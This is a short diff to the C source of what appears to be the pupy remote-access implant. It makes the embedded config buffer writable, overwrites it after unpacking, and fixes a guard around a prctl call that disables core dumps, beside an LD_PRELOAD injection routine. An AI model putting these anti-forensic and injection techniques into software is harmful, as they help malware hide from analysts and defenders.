@@ -26,8 +26,7 @@
 
 static const char module_doc[] = DOC("Builtins utilities for pupy");
 
-__attribute__((aligned(8192)))
-static const char pupy_config[65536] = "####---PUPY_CONFIG_COMES_HERE---####\n";
+static char pupy_config[65536] = "####---PUPY_CONFIG_COMES_HERE---####\n";
 
 static PyObject *ExecError;
 
@@ -66,7 +65,7 @@ Py_get_pupy_config(PyObject *self, PyObject *args)
         ssize_t compressed_size = ntohl(pupy_lzma_length);
 
         config = PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);
-        munmap(pupy_config+sizeof(int), compressed_size);
+        memset(pupy_config, 0xFF, compressed_size);
 
         Py_XINCREF(config);
     }
@@ -144,7 +143,7 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
         close(fd);
     }
 
-#ifdef Linux && !defined(DEBUG)
+#if defined(Linux) && !defined(DEBUG)
     if (cleanup_workaround)
         prctl(4, 0, 0, 0, 0);
 #endif
